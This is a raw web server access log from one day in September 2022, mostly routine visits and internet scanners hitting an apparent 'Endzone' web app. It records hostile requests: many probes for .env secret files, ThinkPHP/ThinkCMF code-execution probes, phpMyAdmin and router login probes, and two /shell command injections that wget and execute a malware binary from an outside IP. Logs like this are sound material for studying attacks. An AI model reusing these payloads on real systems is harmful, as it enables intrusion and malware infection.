154.89.5.207 - - [11/Sep/2022:01:53:22 +0000] "GET / HTTP/1.0" 200 2578 "-" "-"
90.151.171.106 - - [11/Sep/2022:02:10:46 +0000] "CONNECT v4.ident.me:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:02:10:56 +0000] "GET http://v4.ident.me?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:02:11:21 +0000] "-" 408 0 "-" "-"
185.254.196.223 - - [11/Sep/2022:02:14:29 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:02:14:29 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:45 +0000] "GET /Endzone/GameManagement HTTP/1.1" 302 425 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:45 +0000] "GET /Login HTTP/1.1" 200 898 "http://172.104.25.168/Endzone/Formations" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:45 +0000] "GET /static/css/Login.css HTTP/1.1" 200 1179 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:50 +0000] "POST /LoginAttempt HTTP/1.1" 302 740 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:50 +0000] "GET /Endzone/Hub HTTP/1.1" 200 888 "http://172.104.25.168/Login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:50 +0000] "GET /static/css/Hub.css HTTP/1.1" 200 704 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:50 +0000] "GET /static/css/nav.css HTTP/1.1" 200 1398 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:30:50 +0000] "GET /static/images/EndzoneLogo.png HTTP/1.1" 304 274 "http://172.104.25.168/Endzone/Hub" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
66.188.190.72 - - [11/Sep/2022:02:31:41 +0000] "-" 408 0 "-" "-"
184.105.247.195 - - [11/Sep/2022:02:51:57 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
184.105.247.243 - - [11/Sep/2022:02:56:20 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
128.1.248.26 - - [11/Sep/2022:03:16:01 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:03:16:51 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.0.77.75 - - [11/Sep/2022:03:25:02 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
20.0.77.75 - - [11/Sep/2022:03:25:02 +0000] "GET /xmlrpc.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
185.254.196.223 - - [11/Sep/2022:05:13:44 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:05:13:46 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.209.77 - - [11/Sep/2022:06:38:25 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 zgrab/0.x"
139.59.7.139 - - [11/Sep/2022:06:45:58 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:45:58 +0000] "GET /conf/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:45:59 +0000] "GET /wp-content/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:45:59 +0000] "GET /wp-admin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:00 +0000] "GET /library/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:00 +0000] "GET /new/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:01 +0000] "GET /vendor/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:02 +0000] "GET /old/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:02 +0000] "GET /local/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:03 +0000] "GET /api/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:04 +0000] "GET /blog/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:05 +0000] "GET /crm/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:06 +0000] "GET /admin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:06 +0000] "GET /laravel/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:07 +0000] "GET /app/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:07 +0000] "GET /app/config/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:08 +0000] "GET /apps/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:08 +0000] "GET /audio/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:09 +0000] "GET /cgi-bin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:09 +0000] "GET /backend/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:10 +0000] "GET /src/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:10 +0000] "GET /base/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:11 +0000] "GET /core/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:11 +0000] "GET /vendor/laravel/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:12 +0000] "GET /storage/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:13 +0000] "GET /protected/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:14 +0000] "GET /newsite/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:15 +0000] "GET /www/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:16 +0000] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:17 +0000] "GET /database/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:17 +0000] "GET /public/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:18 +0000] "GET /172-104-25-168.ip.linodeusercontent.com/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:18 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
139.59.7.139 - - [11/Sep/2022:06:46:19 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
20.74.143.183 - - [11/Sep/2022:07:19:07 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.74.143.183 - - [11/Sep/2022:07:19:08 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
152.89.196.211 - - [11/Sep/2022:07:23:37 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 960 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
90.151.171.106 - - [11/Sep/2022:07:32:36 +0000] "CONNECT check.best-proxies.ru:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:07:32:49 +0000] "GET http://check.best-proxies.ru/ip.php?Z74643052982Q1 HTTP/1.1" 404 382 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
20.248.144.121 - - [11/Sep/2022:07:38:20 +0000] "\x16\x03" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:20 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:21 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:22 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:38 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:45 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:45 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:46 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:38:47 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
20.248.144.121 - - [11/Sep/2022:07:39:06 +0000] "GET /courier/ HTTP/1.1" 404 382 "-" "Mozilla/5.0"
20.248.144.121 - - [11/Sep/2022:07:39:07 +0000] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0"
20.248.144.121 - - [11/Sep/2022:07:39:26 +0000] "\x16\x03\x01\x02" 400 488 "-" "-"
94.102.61.10 - - [11/Sep/2022:07:43:36 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
152.89.196.211 - - [11/Sep/2022:08:00:21 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:08:13:12 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:08:13:13 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.0.77.75 - - [11/Sep/2022:08:48:50 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
20.0.77.75 - - [11/Sep/2022:08:48:50 +0000] "GET /xmlrpc.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
172.105.77.209 - - [11/Sep/2022:09:16:03 +0000] "-" 408 0 "-" "-"
34.76.96.55 - - [11/Sep/2022:10:05:43 +0000] "GET / HTTP/1.1" 200 997 "-" "python-requests/2.28.1"
195.178.120.159 - - [11/Sep/2022:10:20:32 +0000] "GET / HTTP/1.1" 200 960 "http://172.104.25.168:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
90.151.171.106 - - [11/Sep/2022:10:35:23 +0000] "CONNECT eth0.me:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:10:35:33 +0000] "GET http://eth0.me?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:10:35:48 +0000] "-" 408 0 "-" "-"
80.94.92.239 - - [11/Sep/2022:10:44:19 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
156.219.16.188 - - [11/Sep/2022:11:05:30 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 419 "-" "Hello, world"
185.254.196.223 - - [11/Sep/2022:11:15:11 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:11:15:12 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
42.193.124.235 - - [11/Sep/2022:11:16:14 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
42.193.124.235 - - [11/Sep/2022:11:16:14 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
42.193.124.235 - - [11/Sep/2022:11:16:17 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
80.94.92.239 - - [11/Sep/2022:11:38:49 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
128.14.134.134 - - [11/Sep/2022:11:56:42 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.134.134 - - [11/Sep/2022:11:56:42 +0000] "GET /webfig/ HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
80.94.92.231 - - [11/Sep/2022:12:31:48 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
80.94.92.239 - - [11/Sep/2022:13:36:50 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
192.241.197.96 - - [11/Sep/2022:13:43:50 +0000] "MGLNDD_172.104.25.168_80\n" 400 488 "-" "-"
192.34.56.97 - - [11/Sep/2022:14:01:10 +0000] "GET / HTTP/1.1" 200 960 "http://172.104.25.168:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
185.254.196.223 - - [11/Sep/2022:14:13:18 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:14:13:19 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [11/Sep/2022:14:17:13 +0000] "CONNECT v4.ident.me:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:14:17:28 +0000] "GET http://v4.ident.me?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:14:17:49 +0000] "-" 408 0 "-" "-"
80.94.92.231 - - [11/Sep/2022:14:38:17 +0000] "GET / HTTP/1.1" 200 2559 "-" "-"
46.19.141.122 - - [11/Sep/2022:15:11:07 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://172.104.25.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.164.20.144 - - [11/Sep/2022:15:13:11 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 31.192.107.237/reaper/reap.arm4;chmod+777+/tmp/reap.arm4;sh+/tmp/reap.arm4" 400 488 "-" "-"
5.188.210.227 - - [11/Sep/2022:15:51:48 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 382 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
68.183.148.24 - - [11/Sep/2022:15:54:17 +0000] "GET / HTTP/1.1" 200 960 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
185.220.100.253 - - [11/Sep/2022:15:54:18 +0000] "GET /static/images/Endzone.jpg HTTP/1.1" 200 1492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
195.178.120.159 - - [11/Sep/2022:16:07:26 +0000] "GET / HTTP/1.1" 200 960 "http://172.104.25.168:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
66.154.98.210 - - [11/Sep/2022:16:16:07 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
66.154.98.210 - - [11/Sep/2022:16:16:07 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
80.94.92.239 - - [11/Sep/2022:16:17:20 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.163.63.126 - - [11/Sep/2022:16:56:07 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.163.63.126 - - [11/Sep/2022:16:56:08 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
31.220.1.83 - - [11/Sep/2022:16:58:40 +0000] "GET / HTTP/1.1" 200 941 "-" "Mozilla/5.0 zgrab/0.x"
20.46.240.87 - - [11/Sep/2022:17:14:56 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.46.240.87 - - [11/Sep/2022:17:14:57 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:17:14:57 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [11/Sep/2022:17:14:58 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
101.43.55.216 - - [11/Sep/2022:17:15:22 +0000] "GET http://172.104.25.168:80/mysql/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.55.216 - - [11/Sep/2022:17:15:22 +0000] "GET http://172.104.25.168:80/pma/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.55.216 - - [11/Sep/2022:17:15:22 +0000] "GET http://172.104.25.168:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
101.43.55.216 - - [11/Sep/2022:17:15:22 +0000] "GET http://172.104.25.168:80/db/scripts/setup.php HTTP/1.0" 404 382 "-" "-"
91.191.209.206 - - [11/Sep/2022:17:18:51 +0000] "\x03" 400 488 "-" "-"
109.205.213.23 - - [11/Sep/2022:17:23:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 419 "http://172.104.25.168:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
90.151.171.106 - - [11/Sep/2022:17:27:13 +0000] "CONNECT api.ipify.org:443 HTTP/1.1" 405 345 "-" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
90.151.171.106 - - [11/Sep/2022:17:27:23 +0000] "GET http://api.ipify.org/?Z74643052982Q1 HTTP/1.1" 200 2578 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
